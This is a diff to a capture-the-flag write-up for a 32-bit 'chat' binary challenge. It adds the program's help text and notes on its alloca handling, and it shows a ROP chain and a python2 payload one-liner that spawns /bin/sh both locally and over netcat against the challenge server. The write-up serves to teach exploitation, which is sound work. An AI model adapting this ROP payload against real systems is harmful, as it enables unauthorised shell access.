@@ -31,6 +31,30 @@ ENTRYPOINT ["/usr/bin/socat", "-t5", "-T60", "tcp-listen:1337,max-children=50,re
 ```
 
 # Solution
+```
+./chat
+Command Channel:
+> /h
+Command Commands:
+	/nc	- New Chat Channel - Create and join a new Chat Channel.
+	/jc x	- Join Chat Channel - Join the Chat Channel number x.
+	/lc	- List Chat Channels - Lists the Chat Channels.
+	/q	- Quit - Quit this awesome chat program.
+	/h	- Help - Print this help message.
+> /nc
+Chat Channel 1:
+> /h
+Chat Commands:
+	/e	- Echo - The first line following this command specifies the number of characters to echo.
+	/pc	- Pause Chat Channel - Return to Command Channel. The Chat Channel stays open.
+	/qc	- Quit Chat Channel - Return to Command Channel. The Chat Channel is terminated.
+	/h	- Help - Print this help message.
+That's all for now :/
+> 
+```
+
+The number of characters to echo are read with `fgets` and converted to an integer with `atoi`. Afterwards the memory for the characters is allocated with `alloca`. One cannot wrap esp around with `alloca` by providing a negative number of characters to echo, as the actual characters are also read with `fgets`. And `fgets` doesn't accept a negative size.
+
 Idea:
 
 * There is enough space in the command variable to place the string '/bin/sh', argv, and envp in the bss section.
@@ -105,7 +129,7 @@ ROP dissected:
 
 # ret -> 0x0804901e : pop ebx ; ret
 \x1e\x90\x04\x08
-# ebx -> addr of nick with '/bin/sh'
+# ebx -> addr of command with '/bin/sh'
 \x8c\x73\x0f\x08
 
 # ret -> 0x08051cf6 : pop eax ; ret
@@ -119,10 +143,10 @@ ROP dissected:
 
 This results in these commands:
 ```
-(python2 -c "print '/nc\n/pc\n/nc\n/pc\n/jc 1\n/e\n250000\0\0/bin/sh\x00\x8c\x73\x0f\x08\x00\x00\x00\x00\n\x00\x00\x00\x00\x98\x73\x0f\x08\x94\x73\x0f\x08\x1e\x90\x04\x08\x8c\x73\x0f\x08\xf6\x1c\x05\x08\x0b\x00\x00\x00\xd0\xd3\x07\x08\n/qc\n/jc 2\n'"; cat - ) | ./chat
+$ (python2 -c "print '/nc\n/pc\n/nc\n/pc\n/jc 1\n/e\n250000\0\0/bin/sh\x00\x8c\x73\x0f\x08\x00\x00\x00\x00\n\x00\x00\x00\x00\x98\x73\x0f\x08\x94\x73\x0f\x08\x1e\x90\x04\x08\x8c\x73\x0f\x08\xf6\x1c\x05\x08\x0b\x00\x00\x00\xd0\xd3\x07\x08\n/qc\n/jc 2\n'"; cat - ) | ./chat
 ```
 ```
-(python2 -c "print '/nc\n/pc\n/nc\n/pc\n/jc 1\n/e\n250000\0\0/bin/sh\x00\x8c\x73\x0f\x08\x00\x00\x00\x00\n\x00\x00\x00\x00\x98\x73\x0f\x08\x94\x73\x0f\x08\x1e\x90\x04\x08\x8c\x73\x0f\x08\xf6\x1c\x05\x08\x0b\x00\x00\x00\xd0\xd3\x07\x08\n/qc\n/jc 2\n'"; cat - ) | nc chat.forfuture.fluxfingers.net 1337
+$ (python2 -c "print '/nc\n/pc\n/nc\n/pc\n/jc 1\n/e\n250000\0\0/bin/sh\x00\x8c\x73\x0f\x08\x00\x00\x00\x00\n\x00\x00\x00\x00\x98\x73\x0f\x08\x94\x73\x0f\x08\x1e\x90\x04\x08\x8c\x73\x0f\x08\xf6\x1c\x05\x08\x0b\x00\x00\x00\xd0\xd3\x07\x08\n/qc\n/jc 2\n'"; cat - ) | nc chat.forfuture.fluxfingers.net 1337
 ```
 
 Apparently, the remote solution required `execve('/bin/sh', ["/bin/sh", NULL], [NULL])` and didn't accept `execve('/bin/sh', [NULL], [NULL])`. However, this text book solution had the first execve to begin with and the requirement hasn't been noticed in time.
